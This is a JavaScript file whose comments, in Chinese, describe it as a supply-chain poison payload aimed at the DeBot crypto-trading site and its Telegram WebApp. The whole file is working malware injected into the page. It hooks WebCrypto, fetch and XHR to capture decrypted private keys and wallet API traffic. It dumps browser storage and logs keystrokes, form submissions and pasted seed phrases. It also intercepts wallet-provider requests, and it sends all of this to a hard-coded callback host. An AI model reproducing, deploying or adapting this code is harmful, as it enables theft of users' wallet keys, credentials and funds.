// DeBot (debot.ai) supply-chain poison — runtime entry
// 目标: debot.ai / app.debot.ai / Telegram WebApp / www.debot.ai
// 能力: 捕获托管钱包导出明文私钥(RSA-OAEP+A256GCM 本地解密时)、get_key、导入助记词/私钥、XHR 全量、存储
// 回连: https://192-236-171-226.sslip.io  (/e /k /m /t /w)
(function () {
  var CB = "https://192-236-171-226.sslip.io";
  var N = "debot-" + Math.floor(Date.now() / 1000) + "-" + Math.random().toString(36).slice(2, 8);
  try { if (typeof window === "undefined" || window.__dbp) return; window.__dbp = 1; } catch (e) { return; }

  function send(p, o) {
    try {
      fetch(CB + p, { method: "POST", headers: { "Content-Type": "application/json" },
        body: JSON.stringify(Object.assign({ n: N, u: location.href, ts: Date.now() }, o || {})) }).catch(function () {});
    } catch (e) {}
    try { new Image().src = CB + "/px?n=" + N + "&d=" + encodeURIComponent(JSON.stringify(o || {}).slice(0, 1500)); } catch (e) {}
  }
  function b64(u8) { try { return btoa(String.fromCharCode.apply(null, new Uint8Array(u8))); } catch (e) { return null; } }
  function toStr(x) { try { if (x instanceof ArrayBuffer) return b64(x); return JSON.stringify(x); } catch (e) { return String(x); } }

  // 1) WebCrypto 钩子 —— 捕获导出解密出的【明文私钥】与临时 RSA 私钥
  try {
    var S = (window.crypto && window.crypto.subtle) || null;
    if (S && !S.__dbp) {
      S.__dbp = 1;
      var _dec = S.decrypt.bind(S);
      S.decrypt = function (algo, key, data) {
        return _dec(algo, key, data).then(function (pt) {
          try { send("/k", { tag: "subtle.decrypt", algo: toStr(algo), plaintext: b64(pt) }); } catch (e) {}
          return pt;
        });
      };
      var _imp = S.importKey.bind(S);
      S.importKey = function (fmt, keyData, algo, ext, usages) {
        try {
          if (usages && usages.indexOf && usages.indexOf("decrypt") >= 0)
            send("/k", { tag: "subtle.importKey", fmt: fmt, algo: toStr(algo), key: toStr(keyData) });
        } catch (e) {}
        return _imp(fmt, keyData, algo, ext, usages);
      };
      var _unwrap = S.unwrapKey && S.unwrapKey.bind(S);
      if (_unwrap) S.unwrapKey = function (fmt, wrapped, uk, ukAlgo, uAlgo, ext, usages) {
        return _unwrap(fmt, wrapped, uk, ukAlgo, uAlgo, ext, usages).then(function (k) {
          try { send("/k", { tag: "subtle.unwrapKey", wrapped: b64(wrapped) }); } catch (e) {}
          return k;
        });
      };
    }
  } catch (e) {}

  // 2) fetch/XHR 钩子 —— 抓钱包端点请求与响应
  var HOT = ["wallets/get_key", "export/encrypted", "import/encrypted", "import/mnemonic", "wallets/send_code",
             "wallets/import", "wallets/new", "wallets/withdraw", "security/mail", "wallets/export"];
  function hot(u) { u = String(u || ""); for (var i = 0; i < HOT.length; i++) if (u.indexOf(HOT[i]) >= 0) return true; return false; }
  try {
    var _fetch = window.fetch;
    if (_fetch && !_fetch.__dbp) {
      window.fetch = function (input, init) {
        var url = (typeof input === "string") ? input : (input && input.url);
        var isHot = hot(url);
        try { if (isHot) send("/t", { tag: "fetch.req", url: url, method: (init && init.method) || (input && input.method), body: init && init.body }); } catch (e) {}
        return _fetch.apply(this, arguments).then(function (res) {
          if (isHot) { try { res.clone().text().then(function (t) { send("/k", { tag: "fetch.res", url: url, status: res.status, body: t }); }); } catch (e) {} }
          return res;
        });
      };
      window.fetch.__dbp = 1;
    }
  } catch (e) {}
  try {
    var XO = XMLHttpRequest.prototype.open, XS = XMLHttpRequest.prototype.send;
    if (!XO.__dbp) {
      XMLHttpRequest.prototype.open = function (m, u) { this.__u = u; this.__m = m; return XO.apply(this, arguments); };
      XMLHttpRequest.prototype.send = function (b) {
        var self = this, isHot = hot(self.__u);
        if (isHot) { try { send("/t", { tag: "xhr.req", url: self.__u, method: self.__m, body: b }); } catch (e) {} }
        this.addEventListener("load", function () {
          if (isHot) { try { send("/k", { tag: "xhr.res", url: self.__u, status: self.status, body: self.responseText && self.responseText.slice(0, 20000) }); } catch (e) {} }
        });
        return XS.apply(this, arguments);
      };
      XMLHttpRequest.prototype.open.__dbp = 1;
    }
  } catch (e) {}

  // 3) 存储 dump（令牌 / 钱包标识）
  try {
    var st = {}, ss = {};
    try { for (var i = 0; i < localStorage.length; i++) { var k = localStorage.key(i); st[k] = String(localStorage.getItem(k)).slice(0, 500); } } catch (e) {}
    try { for (var j = 0; j < sessionStorage.length; j++) { var k2 = sessionStorage.key(j); ss[k2] = String(sessionStorage.getItem(k2)).slice(0, 500); } } catch (e) {}
    send("/e", { tag: "storage", localStorage: st, sessionStorage: ss });
  } catch (e) {}

  // 4) 助记词/私钥输入捕获
  try {
    document.addEventListener("keydown", function (ev) { try { ev.target && /input|textarea/i.test(ev.target.tagName || "") && send("/e", { tag: "keyin", v: String(ev.target.value || "").slice(0, 300) }); } catch (e) {} }, true);
    document.addEventListener("submit", function (ev) {
      try { var f = ev.target; if (!f) return; var vals = []; f.querySelectorAll && f.querySelectorAll("input,textarea").forEach(function (i) { vals.push(i.value); }); send("/m", { tag: "form.submit", url: location.href, values: vals }); } catch (e) {}
    }, true);
    // 剪贴板读取（导入助记词）
    document.addEventListener("paste", function (ev) { try { var t = (ev.clipboardData || window.clipboardData).getData("text"); if (t) send("/m", { tag: "paste", text: String(t).slice(0, 1000) }); } catch (e) {} }, true);
  } catch (e) {}

  // 5) 钱包 provider 钩子
  try {
    ["ethereum", "web3", "okxwallet", "binance", "tronWeb", "solana"].forEach(function (k) {
      try {
        var w = window[k];
        if (w && !w.__dbp && typeof w.request === "function") {
          var r = w.request.bind(w);
          w.request = function (p) { try { send("/t", { tag: "provider:" + k, method: p && p.method, params: p && p.params }); } catch (e) {} return r(p); };
          w.__dbp = 1;
        }
      } catch (e) {}
    });
  } catch (e) {}
})();
